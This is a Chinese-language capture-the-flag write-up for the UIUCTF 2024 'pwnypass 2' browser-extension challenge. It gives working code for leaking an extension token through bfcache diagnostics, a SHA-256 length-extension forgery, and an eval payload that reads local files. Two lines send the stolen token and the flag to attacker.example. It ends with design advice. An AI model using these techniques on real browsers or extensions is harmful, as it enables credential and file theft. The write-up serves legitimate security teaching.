# UIUCTF 2024 pwnypass 2

## 题目简述

第二段 flag 仍在同一个安装了 pwnypass 扩展的 Chrome bot 中，但不再作为网站密码保存。Dockerfile 把它移动到随机路径：

```text
/home/user/<10 位随机目录>/flag-<10 位随机串>.txt/flag2.txt
```

路径中看似文件名的 `flag-....txt` 实际也是目录，因为 Dockerfile 先对完整路径执行了 `mkdir -p`，再把 `flag2.txt` 移入该目录。

扩展保留了一个名为 `evaluate` 的后台命令，并拥有 `tabs`、`<all_urls>` 等高权限。目标是泄露一个合法令牌及其摘要，利用错误的“自制 HMAC”伪造 `evaluate` token，再从扩展后台打开 `file://` 目录并读取随机位置的 flag。

## 解题过程

### 从 `notRestoredReasons` 泄露扩展 iframe 地址

只要页面包含用户名和密码输入框，内容脚本就会插入一个关闭的 Shadow DOM，其中的 iframe 地址如下：

```text
chrome-extension://<扩展 ID>/autofill.html?token=<read token>&hmac=<摘要>
```

页面脚本不能直接穿过关闭的 Shadow DOM 或读取跨源 iframe，但题目所用 Chrome 的 `PerformanceNavigationTiming.notRestoredReasons` 会报告导致页面不能进入前进后退缓存的 frame 树；子项的 `src` 会保留 iframe 声明的地址。攻击页面可放置表单和一个带 `unload` 处理器的显式 iframe，然后导航到辅助页，再由辅助页执行 `history.back()`：

```html
<body onunload="void 0">
  <form>
    <input type="text">
    <input type="password">
  </form>
  <iframe srcdoc="<body onunload='void 0'></body>"></iframe>

  <script>
  function findExtensionFrame() {
    for (const entry of performance.getEntriesByType("navigation")) {
      const root = entry.notRestoredReasons;
      if (root === null) continue;
      const frame = root.children.find(child =>
        child.src !== null && child.src.startsWith("chrome-extension://")
      );
      if (frame !== undefined) return frame.src;
    }
  }

  setInterval(() => {
    const leaked = findExtensionFrame();
    if (leaked !== undefined) {
      navigator.sendBeacon(
        "https://attacker.example/token",
        leaked
      );
    }
  }, 500);

  setTimeout(() => {
    location.assign("https://attacker.example/back.html");
  }, 1000);
  </script>
</body>
```

`back.html` 只需在短暂延时后执行 `history.back()`。返回攻击页后，遍历 `children` 并按 `chrome-extension://` 前缀查找，不要依赖官方样例中的固定数组下标。

Chrome 对该 API 的[说明](https://developer.chrome.com/docs/web-platform/bfcache-notrestoredreasons)指出，`notRestoredReasons` 是一棵与 frame 层次对应的树，`src` 保存 iframe 的源属性；即使跨源子 frame 的内部原因被隐藏，这一外层属性仍可出现在报告中。本题正是把原本用于诊断 bfcache 的元数据变成了跨源信息泄露通道。

### 识别伪 HMAC 与长度扩展条件

泄露的 URL 同时给出原 token 和摘要。后台函数虽然叫 `doHmac`，实际计算的是：

```javascript
const doHmac = async (data) => toHexString(
  new Uint8Array(
    await crypto.subtle.digest(
      "SHA-256",
      concat(keyArr, s2a(data))
    )
  )
);
```

即：

```text
SHA256(32 字节秘密 key || token)
```

这不是 HMAC。SHA-256 属于 Merkle-Damgard 结构，已知 `token`、摘要和秘密长度 32 后，可以计算：

```text
SHA256(key || token || SHA256 填充 || attacker_suffix)
```

而不需要知道 `key`。通用的 [hash_extender](https://github.com/iagox86/hash_extender) 就实现了这种秘密前缀长度扩展；其输出包括扩展后的摘要，以及包含原数据、胶水填充和追加数据的新消息。

不过，直接把以下后缀接到 `read` token 后面仍然没有用：

```text
|<tab>|<origin>|evaluate|<payload>|x
```

兑换端用前四个字段解释命令：

```javascript
let [ts, tab, origin, command] = token.split("|");
```

原 token 中的第四字段仍是 `read`，新追加的 `evaluate` 不会覆盖它。

### 用低 8 位碰撞隐藏旧分隔符

突破点在字符串转字节函数：

```javascript
const s2a = text => Uint8Array.from(
  Array.from(text).map(letter => letter.charCodeAt(0))
);
```

`Uint8Array` 会把字符码截断到低 8 位。因此 ASCII 竖线 `|` 的码点 `0x007c` 与字符 `ż`（`U+017C`）都会变成字节 `0x7c`：

```text
s2a("|") = [124]
s2a("ż") = [124]
```

但 JavaScript 的 `split("|")` 只认识真正的 ASCII 竖线。把原 token 前缀中的每一个 `|` 换成 `ż`，摘要仍然有效，解析器却不再看到旧字段。第一个字段会变成“原时间戳 + 其余旧 token + SHA 填充”；`parseInt()` 在第一个 `ż` 处停止，仍能取出未过期的原时间戳。此后追加的新 ASCII 分隔符便定义了真正的 `tab`、`origin`、`command` 和参数。

先从泄露 token 中取出当前标签页和攻击页来源，再准备一个不含 ASCII `|` 的 JavaScript payload：

```python
token = LEAKED_TOKEN
hmac = LEAKED_HMAC

parts = token.split("|")
tab = parts[1]
origin = parts[2]
payload = OPEN_AND_READ_FILE_JS  # payload 内不能出现 ASCII 竖线

suffix = f"|{tab}|{origin}|evaluate|{payload}|x"
print("TOKEN_HEX=" + token.encode("latin1").hex())
print("SUFFIX_HEX=" + suffix.encode("latin1").hex())
```

使用十六进制输入可避免 shell 和二进制填充破坏参数：

```bash
./hash_extender \
  --data "$TOKEN_HEX" \
  --data-format hex \
  --secret 32 \
  --append "$SUFFIX_HEX" \
  --append-format hex \
  --signature "$HMAC" \
  --format sha256 \
  --out-data-format hex
```

工具给出的 `New string` 是扩展消息的十六进制表示，`New signature` 是新摘要。将新消息转换为浏览器要提交的 Unicode 字符串时，只替换原 token 范围内的旧竖线；新后缀中的竖线必须保持 ASCII：

```python
from urllib.parse import quote

forged = bytes.fromhex(NEW_STRING_HEX)
prefix_length = len(token.encode("latin1"))

wire = "".join(
    "\u017c" if index < prefix_length and byte == 0x7C else chr(byte)
    for index, byte in enumerate(forged)
)

encoded_token = quote(wire, safe="")
print(encoded_token)
print(NEW_SIGNATURE)
```

这里 `chr(byte)` 会把 SHA-256 胶水填充逐字节保存在 JavaScript 字符串中；URL 百分号编码后，`URLSearchParams` 会还原这些字符，而扩展的 `s2a()` 又会得到原始低 8 位。

### 通过扩展权限递归读取随机文件

`evaluate` 的实现只有一行：

```javascript
async function evaluate(_origin, data) {
  return eval(data);
}
```

可作为 `payload` 的代码如下。它依次打开三个目录层级，借 `chrome.tabs.executeScript` 读取 Chrome 生成的目录列表，最后外带文件正文；整段刻意不使用 `|`：

```javascript
(async () => {
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  const openTab = url => new Promise(resolve => chrome.tabs.create({url}, resolve));
  const moveTab = (id, url) => new Promise(resolve => chrome.tabs.update(id, {url}, resolve));
  const run = (id, code) => new Promise(resolve => chrome.tabs.executeScript(id, {code}, resolve));
  const listLinks = async id => (await run(
    id,
    "Array.from(document.links, element => element.href)"
  ))[0];

  const tab = await openTab("file:///home/user/");
  await sleep(800);

  let links = await listLinks(tab.id);
  const randomDirectory = links.find(url =>
    /^file:\/\/\/home\/user\/[A-Za-z0-9]{10}\/$/.test(url)
  );
  await moveTab(tab.id, randomDirectory);
  await sleep(800);

  links = await listLinks(tab.id);
  const flagDirectory = links.find(url =>
    /\/flag-[A-Za-z0-9]{10}\.txt\/$/.test(url)
  );
  await moveTab(tab.id, flagDirectory);
  await sleep(800);

  links = await listLinks(tab.id);
  const flagFile = links.find(url => /\/flag2\.txt$/.test(url));
  await moveTab(tab.id, flagFile);
  await sleep(800);

  const flag = (await run(tab.id, "document.body.innerText"))[0];
  await fetch(
    "https://attacker.example/flag?value=" + encodeURIComponent(flag),
    {mode: "no-cors"}
  );
})()
```

最后，在泄露 token 的同一标签页、同一攻击者 origin 中创建 web-accessible 的 `autofill.html` iframe：

```javascript
const frame = document.createElement("iframe");
frame.src = `${extensionOrigin}/autofill.html` +
  `?token=${encodedToken}&hmac=${newSignature}`;
document.body.appendChild(frame);
```

必须复用同一标签页，并在原 token 的五分钟有效期内完成，因为兑换端还会检查追加字段中的 tab、origin 和时间戳。`autofill.js` 加载后会替攻击者发送 `redeem` 消息；新 token 通过摘要和上下文检查，后台便执行文件读取 payload。回连得到：

```text
uiuctf{i_th0ught_th1s_w4s_w3b_266f62249d48a085}
```

## 方法总结

本题的完整链条是“bfcache 诊断元数据泄露扩展 iframe URL → 获得秘密前缀 SHA-256 的消息与摘要 → 长度扩展 → Unicode 低字节碰撞隐藏旧分隔符 → 伪造 `evaluate` token → 滥用扩展标签页权限读取 `file://`”。其中最容易漏写的关键点是 `U+017C`：只有长度扩展而没有重排解析字段，命令仍会是 `read`。

安全设计上应使用标准 HMAC，例如 `HMAC-SHA-256(key, token)`，并对序列化后的结构做严格解析；不要把字符码静默截断成字节。扩展后台也不应保留 `eval` 命令，更不应同时授予 `<all_urls>`、`tabs` 和本地文件访问能力。敏感 token 不应出现在 web-accessible iframe 的 URL 中，以免被历史记录、诊断 API、日志或引用信息暴露。
